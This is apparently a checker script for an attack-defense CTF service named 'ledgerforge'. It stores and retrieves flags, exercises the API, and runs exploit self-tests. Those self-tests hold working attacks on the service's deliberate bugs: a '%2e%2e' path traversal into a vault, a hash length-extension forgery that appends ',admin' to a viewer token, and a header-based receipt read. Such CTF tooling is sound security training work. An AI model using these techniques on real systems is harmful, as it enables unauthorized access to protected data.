from __future__ import annotations

import json
import urllib.parse
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher
from httpx import AsyncClient

from client import (
    Credentials,
    b64url,
    ensure_status,
    fresh_creds,
    header_secret,
    json_or_mumble,
    login,
    noise_word,
    post_task,
    register,
)


checker = Enochecker("ledgerforge", 8080)
app = lambda: checker.app


# -----------------------------------------------------------------------------
# variant 0 — vault doc (canonicalization)
# -----------------------------------------------------------------------------

@checker.putflag(0)
async def putflag_vault(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 0, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_vault: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 0:
        raise MumbleException("putflag_vault: wrong variant")
    await db.set("v0", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(0)
async def getflag_vault(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v0")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_vault: flag drift")
    await post_task(client, "GETFLAG", task.current_round_id, 0, flag=task.flag, attack_info=json.dumps(saved["info"]))
    listing = await client.get("/api/docs")
    await ensure_status(listing, 200, "getflag_vault docs")
    body = await json_or_mumble(listing, "getflag_vault docs")
    doc_id = saved["info"].get("a")
    if not any(doc.get("id") == doc_id for doc in body.get("docs", [])):
        raise MumbleException("vault doc id missing from listing")


# -----------------------------------------------------------------------------
# variant 1 — settlement (length-extensible viewer token)
# -----------------------------------------------------------------------------

@checker.putflag(1)
async def putflag_settlement(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 1, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_settlement: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 1:
        raise MumbleException("putflag_settlement: wrong variant")
    for field in ("a", "b", "token"):
        if field not in info:
            raise MumbleException(f"putflag_settlement: missing {field}")
    await db.set("v1", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(1)
async def getflag_settlement(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v1")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_settlement: flag drift")
    await post_task(client, "GETFLAG", task.current_round_id, 1, flag=task.flag, attack_info=json.dumps(saved["info"]))


# -----------------------------------------------------------------------------
# variant 2 — treasury receipt (empty-scope-set logic bug)
# -----------------------------------------------------------------------------

@checker.putflag(2)
async def putflag_treasury(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 2, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_treasury: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 2:
        raise MumbleException("putflag_treasury: wrong variant")
    await db.set("v2", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(2)
async def getflag_treasury(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v2")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_treasury: flag drift")
    await post_task(client, "GETFLAG", task.current_round_id, 2, flag=task.flag, attack_info=json.dumps(saved["info"]))


# -----------------------------------------------------------------------------
# noise
# -----------------------------------------------------------------------------

@checker.putnoise(0)
async def putnoise_vault(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 0)


@checker.getnoise(0)
async def getnoise_vault(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 0)


@checker.putnoise(1)
async def putnoise_settlement(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 1)


@checker.getnoise(1)
async def getnoise_settlement(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 1)


@checker.putnoise(2)
async def putnoise_treasury(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 2)


@checker.getnoise(2)
async def getnoise_treasury(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 2)


# -----------------------------------------------------------------------------
# havoc — exercise the public surface
# -----------------------------------------------------------------------------

@checker.havoc(0)
async def havoc_index(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    health = await client.get("/health")
    await ensure_status(health, 200, "havoc index health")
    whoami = await client.get("/whoami")
    await ensure_status(whoami, 200, "havoc index whoami")
    grant = await client.get("/api/grants/guest-mirror")
    await ensure_status(grant, 200, "havoc index grant")
    body = await json_or_mumble(grant, "havoc index grant")
    if not isinstance(body.get("grant"), str) or len(body["grant"]) < 16:
        raise MumbleException("havoc index: bad grant shape")
    read = await client.get(
        "/api/read",
        params={"path": "/public/welcome", "grant": body["grant"]},
    )
    await ensure_status(read, 200, "havoc index read")
    read_body = await json_or_mumble(read, "havoc index read")
    if "LedgerForge" not in str(read_body.get("body", "")):
        raise MumbleException("welcome doc body missing")


@checker.havoc(1)
async def havoc_accounts(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    creds = fresh_creds("hv1")
    await register(client, creds)
    me = await client.get("/api/accounts/me")
    await ensure_status(me, 200, "havoc accounts me")
    out = await client.post("/api/accounts/logout")
    await ensure_status(out, 200, "havoc accounts logout")
    bad = await client.post("/api/accounts/login", json={"username": creds.username, "password": "wrong"})
    if bad.status_code != 401:
        raise MumbleException("havoc accounts: wrong-password not rejected")


@checker.havoc(2)
async def havoc_rate_limit(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    status = await client.get("/api/rate-limit/status")
    await ensure_status(status, 200, "havoc rate status")
    tripped = False
    for _ in range(40):
        bad = await client.post("/api/accounts/login", json={"username": "nobody", "password": "x"})
        if bad.status_code == 429:
            tripped = True
            break
    if not tripped:
        raise MumbleException("rate limit did not trip after burst")


@checker.havoc(3)
async def havoc_lfql(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    r = await client.post("/api/query", json={"script": "LIST:public"})
    await ensure_status(r, 200, "havoc lfql list")
    body = await json_or_mumble(r, "havoc lfql list")
    if not isinstance(body.get("rows"), list) or not body["rows"]:
        raise MumbleException("LFQL LIST:public returned empty")
    r2 = await client.post("/api/query", json={"script": "LOAD:public::missing-id"})
    body2 = await json_or_mumble(r2, "havoc lfql load missing")
    if body2.get("rows"):
        raise MumbleException("LFQL LOAD on unknown id should return empty")


@checker.havoc(4)
async def havoc_branches(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    creds = fresh_creds("hv4")
    await register(client, creds)
    commit = await client.post(
        "/api/v1/commit",
        json={"branch": "public-checker", "body": f"hv4-body-{noise_word()}", "signer": creds.username},
    )
    await ensure_status(commit, 200, "havoc branches commit")
    commit_body = await json_or_mumble(commit, "havoc branches commit")
    proof = await client.get(f"/api/v1/proof/{commit_body['id']}")
    await ensure_status(proof, 200, "havoc branches proof")
    proof_body = await json_or_mumble(proof, "havoc branches proof")
    if "body" in proof_body:
        raise MumbleException("/api/v1/proof must not include body field")
    if "proof" not in proof_body:
        raise MumbleException("/api/v1/proof must include merkle path")


@checker.havoc(5)
async def havoc_snapshots(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    exported = await client.get("/api/snapshots/boot/export", params={"claim": "public:welcome-ledger"})
    await ensure_status(exported, 200, "havoc snapshot export")
    body = await json_or_mumble(exported, "havoc snapshot export")
    rows = body.get("rows") or []
    if not any(r.get("id") == "welcome-ledger" for r in rows):
        raise MumbleException("welcome doc missing from boot snapshot")
    miss = await client.get("/api/snapshots/boot/export", params={"claim": "public:does-not-exist"})
    await ensure_status(miss, 200, "havoc snapshot export miss")
    miss_body = await json_or_mumble(miss, "havoc snapshot export miss")
    if miss_body.get("rows"):
        raise MumbleException("snapshot export must return empty for unknown id")


@checker.havoc(6)
async def havoc_replicas(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    peer = f"hv6-{noise_word()}"
    hb = await client.post(f"/api/v1/replicas/{peer}/heartbeat", json={"cursor": "0"})
    await ensure_status(hb, 200, "havoc replicas heartbeat")
    since = await client.get(f"/api/v1/replicas/{peer}/since/0")
    await ensure_status(since, 200, "havoc replicas since")


@checker.havoc(7)
async def havoc_indexer(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    r = await client.get("/api/indexer/stats")
    await ensure_status(r, 200, "havoc indexer stats")
    body = await json_or_mumble(r, "havoc indexer stats")
    if "merkle_root" not in body:
        raise MumbleException("indexer stats missing merkle_root")


@checker.havoc(8)
async def havoc_apitokens(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    creds = fresh_creds("hv8")
    await register(client, creds)
    mint = await client.post("/api/tokens", json={"scopes": ["settlements:read"], "label": "checker", "ttl": 3600})
    await ensure_status(mint, 200, "havoc tokens mint")
    listing = await client.get("/api/tokens")
    await ensure_status(listing, 200, "havoc tokens list")


# -----------------------------------------------------------------------------
# exploit self-tests
# -----------------------------------------------------------------------------

@checker.exploit(0)
async def exploit_vault(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 0:
        raise InternalErrorException("exploit_vault: wrong variant")
    grant_resp = await client.get("/api/grants/guest-mirror")
    await ensure_status(grant_resp, 200, "exploit_vault grant")
    grant = (await json_or_mumble(grant_resp, "exploit_vault grant")).get("grant")
    if not grant:
        raise MumbleException("exploit_vault: missing grant")
    doc_id = str(info.get("a"))
    crafted_path = f"/public/%2e%2e/vault/{doc_id}"
    r = await client.get(
        "/api/read",
        params={"path": urllib.parse.unquote(crafted_path), "grant": grant},
    )
    if r.status_code != 200:
        r = await client.get(f"/api/read?path={crafted_path}&grant={urllib.parse.quote(grant, safe='._-')}")
    await ensure_status(r, 200, "exploit_vault read")
    body = (await json_or_mumble(r, "exploit_vault read")).get("body", "")
    flag = searcher.search_flag(str(body))
    if not flag:
        raise MumbleException("exploit_vault: flag missing from body")
    return flag


@checker.exploit(1)
async def exploit_settlement(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    from length_ext import extend, iter_lengths
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 1:
        raise InternalErrorException("exploit_settlement: wrong variant")
    settlement_id = str(info["a"])
    public_viewer = str(info.get("b", "public")).encode("utf-8")
    original_digest = str(info["token"])
    head = f"|{settlement_id}|".encode("utf-8")
    extension = b",admin"
    last_error: str | None = None
    for secret_len in iter_lengths():
        original_len = secret_len + len(head) + len(public_viewer)
        glue, new_digest = extend(original_digest, original_len, extension)
        crafted_viewer = public_viewer + glue + extension
        viewer_b64 = b64url(crafted_viewer)
        r = await client.get(
            f"/api/settlements/{settlement_id}",
            params={"viewer": viewer_b64, "token": new_digest},
        )
        if r.status_code != 200:
            last_error = f"http {r.status_code}"
            continue
        body = r.text
        flag = searcher.search_flag(body)
        if flag:
            return flag
        last_error = "body lacked flag"
    raise MumbleException(f"exploit_settlement: length extension exhausted ({last_error})")


@checker.exploit(2)
async def exploit_treasury(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 2:
        raise InternalErrorException("exploit_treasury: wrong variant")
    receipt_id = info["a"]
    r = await client.get(
        f"/api/treasury/receipts/{receipt_id}",
        headers={"X-Viewer-Key": str(info.get("b", "public-viewer"))},
    )
    await ensure_status(r, 200, "exploit_treasury read")
    flag = searcher.search_flag(r.text)
    if not flag:
        raise MumbleException("exploit_treasury: flag missing from body")
    return flag
